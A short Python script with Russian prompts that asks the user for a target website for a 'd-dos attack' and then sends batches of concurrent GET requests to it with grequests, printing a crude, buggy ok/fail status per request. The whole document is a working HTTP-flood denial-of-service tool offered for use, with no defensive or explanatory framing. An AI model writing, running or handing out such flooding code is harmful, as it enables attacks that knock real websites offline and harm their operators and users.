import grequests
k0 = str(input("Введите сайт на который будет вестись d-dos атака: "))
k1 = int(input("Введите сколько пачек будет запросов: "))
k2 = int(input("Введите сколько запросов в пачке: "))
for l in range(int(k1)):
    n = k2 #Количество запросов
    sites = [k0 for x in range(n)]
    res = (grequests.get(url) for url in sites)
    r = grequests.map(res)
    #<Response [200]>
    for num, i in enumerate(r):
        a = 'fail'
        for b in list(str(r)):
            if b =='2':
                a = 'ok'
        print(f'{num+1}-{a}')

    print(r)
